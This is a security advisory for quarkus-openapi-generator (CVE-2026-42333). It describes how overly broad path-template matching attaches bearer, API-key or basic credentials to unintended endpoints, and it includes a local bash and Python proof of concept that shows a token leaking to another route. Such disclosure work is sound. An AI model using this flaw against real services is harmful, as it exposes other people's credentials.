# [M] quarkus-openapi-generator has overly broad path-parameter matching that sends authentication headers to unintended operations

## Summary
Severity: Medium
Advisory: GHSA-fr8f-rwjx-f32v
CVE: CVE-2026-42333
CWE: CWE-200
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-fr8f-rwjx-f32v
Type: github-advisory

## Affected
- Maven: `io.quarkiverse.openapi.generator:quarkus-openapi-generator` — affected >=0 <2.16.0-lts
- Maven: `io.quarkiverse.openapi.generator:quarkus-openapi-generator` — affected >=2.16.0 <2.17.0

## Details
### Summary

The generated authentication filter matches OpenAPI path templates too broadly when deciding whether to attach credentials. A security scheme configured for one operation can therefore be applied to a different same-method operation whose path only partially resembles the protected template, causing bearer tokens, API keys, or basic credentials to be sent to unintended endpoints.

### Details

The runtime authentication layer selects credentials by comparing the outgoing request path and method against the set of protected OpenAPI operations. Path-template matching treats `{param}` placeholders as `.*`, which incorrectly allows a single path parameter to consume `/`.

As a result, a protected path such as `/repos/{ref}` also matches `/repos/foo/bar`, even though `/repos/{owner}/{repo}` is a different operation. When a client invokes the unprotected operation, the authentication filter still concludes that the protected operation matched and attaches its credentials.

This affects authentication providers that rely on the shared path-matching logic, including bearer, OAuth, API-key, and basic authentication. The issue is reachable through normal generated-client usage and does not require modifying generated code.

### PoC

```bash
mkdir -p /tmp/qoag-poc/src/main/java/org/acme
mkdir -p /tmp/qoag-poc/src/main/resources
mkdir -p /tmp/qoag-poc/src/main/openapi

cat > /tmp/qoag-poc/pom.xml <<'EOF'
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>org.acme</groupId>
  <artifactId>qoag-poc</artifactId>
  <version>1.0.0</version>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.release>17</maven.compiler.release>
    <quarkus.platform.group-id>io.quarkus</quarkus.platform.group-id>
    <quarkus.platform.artifact-id>quarkus-bom</quarkus.platform.artifact-id>
    <quarkus.platform.version>3.34.3</quarkus.platform.version>
    <qoag.version>2.16.0</qoag.version>
  </properties>

  <dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>${quarkus.platform.group-id}</groupId>
        <artifactId>${quarkus.platform.artifact-id}</artifactId>
        <version>${quarkus.platform.version}</version>
        <type>pom</type>
        <scope>import</scope>
      </dependency>
    </dependencies>
  </dependencyManagement>

  <dependencies>
    <dependency>
      <groupId>io.quarkiverse.openapi.generator</groupId>
      <artifactId>quarkus-openapi-generator</artifactId>
      <version>${qoag.version}</version>
    </dependency>
    <dependency>
      <groupId>io.quarkus</groupId>
      <artifactId>quarkus-rest</artifactId>
    </dependency>
    <dependency>
      <groupId>io.quarkus</groupId>
      <artifactId>quarkus-rest-client-jackson</artifactId>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>io.quarkus</groupId>
        <artifactId>quarkus-maven-plugin</artifactId>
        <version>${quarkus.platform.version}</version>
        <extensions>true</extensions>
        <executions>
          <execution>
            <goals>
              <goal>build</goal>
              <goal>generate-code</goal>
              <goal>generate-code-tests</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
      <plugin>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.14.0</version>
        <configuration>
          <parameters>true</parameters>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
EOF

cat > /tmp/qoag-poc/src/main/openapi/repro.yaml <<'EOF'
openapi: 3.0.3
info:
  title: repro
  version: 1.0.0

paths:
  /repos/{ref}:
    get:
      operationId: getRef
      parameters:
        - in: path
          name: ref
          required: true
          schema:
            type: string
      security:
        - bearerAuth: []
      responses:
        "200":
          description: ok
          content:
            text/plain:
              schema:
                type: string

  /repos/{owner}/{repo}:
    get:
      operationId: getOwnerRepo
      parameters:
        - in: path
          name: owner
          required: true
          schema:
            type: string
        - in: path
          name: repo
          required: true
          schema:
            type: string
      responses:
        "200":
          description: ok
          content:
            text/plain:
              schema:
                type: string

components:
  securitySchemes:
    bearerAuth:
      type: http
      scheme: bearer
EOF

cat > /tmp/qoag-poc/src/main/resources/application.properties <<'EOF'
quarkus.http.port=8081
quarkus.openapi-generator.codegen.default-security-scheme=bearerAuth
quarkus.openapi-generator.codegen.spec.repro_yaml.base-package=org.acme.repro
quarkus.rest-client.repro_yaml.url=http://127.0.0.1:18080
quarkus.openapi-generator.repro_yaml.auth.bearerAuth.bearer-token=SECRET
EOF

cat > /tmp/qoag-poc/src/main/java/org/acme/TriggerResource.java <<'EOF'
package org.acme;

import jakarta.ws.rs.GET;
import jakarta.ws.rs.Path;
import jakarta.ws.rs.Produces;
import jakarta.ws.rs.core.MediaType;
import org.eclipse.microprofile.rest.client.inject.RestClient;

@Path("/trigger")
public class TriggerResource {
    @RestClient
    org.acme.repro.api.DefaultApi api;

    @GET
    @Produces(MediaType.TEXT_PLAIN)
    public String trigger() {
        api.getOwnerRepo("foo", "bar");
        return "done";
    }
}
EOF

python - <<'PY' &
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print("PATH=" + self.path, flush=True)
        print("AUTH=" + str(self.headers.get("Authorization")), flush=True)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, fmt, *args):
        pass
HTTPServer(("127.0.0.1", 18080), H).serve_forever()
PY

cd /tmp/qoag-poc
mvn -q package -DskipTests
java -jar target/quarkus-app/quarkus-run.jar &
sleep 8
curl -s http://127.0.0.1:8081/trigger

# PATH=/repos/foo/bar
# AUTH=Bearer SECRET
```

### Impact

Clients generated from an OpenAPI specification can send authentication credentials to endpoints that were not intended to receive them. In practice, this can disclose bearer tokens, API keys, or basic credentials to lower-trust routes on the same service, cause public operations to be invoked with privileged credentials, and blur the intended security boundary between protected and unprotected operations.

## References
- https://github.com/quarkiverse/quarkus-openapi-generator/security/advisories/GHSA-fr8f-rwjx-f32v
- https://nvd.nist.gov/vuln/detail/CVE-2026-42333
- https://github.com/quarkiverse/quarkus-openapi-generator/pull/1586
- https://github.com/quarkiverse/quarkus-openapi-generator
- https://github.com/quarkiverse/quarkus-openapi-generator/releases/tag/2.11.1-lts
- https://github.com/quarkiverse/quarkus-openapi-generator/releases/tag/2.16.0-lts
- https://github.com/quarkiverse/quarkus-openapi-generator/releases/tag/2.17.0
